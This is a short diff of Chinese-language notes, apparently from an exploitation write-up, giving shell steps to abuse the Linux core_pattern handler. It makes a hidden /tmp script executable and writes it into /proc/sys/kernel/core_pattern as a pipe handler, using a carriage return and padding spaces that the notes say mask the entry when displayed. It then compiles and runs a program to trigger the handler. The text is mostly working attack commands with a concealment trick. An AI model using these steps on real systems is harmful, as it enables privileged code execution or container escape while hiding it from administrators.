@@ -1,0 +1,15 @@
+chmod 755 /tmp/.1.py
+
+然后再修改/proc/sys/kernel/core_pattern的内容，执行如下命令：
+
+echo -e "|/tmp/.1.py \rcore            " >  /proc/sys/kernel/core_pattern
+
+注： core后面有若干空格，不可省略（多余的空格是为了在显示的时候遮盖前面的内容）
+
+gcc -g 1.c -o a.out 
+
+chmod +x a.out
+
+./a.out
+
+只能用一次，暂时没想到比较好的利用方式
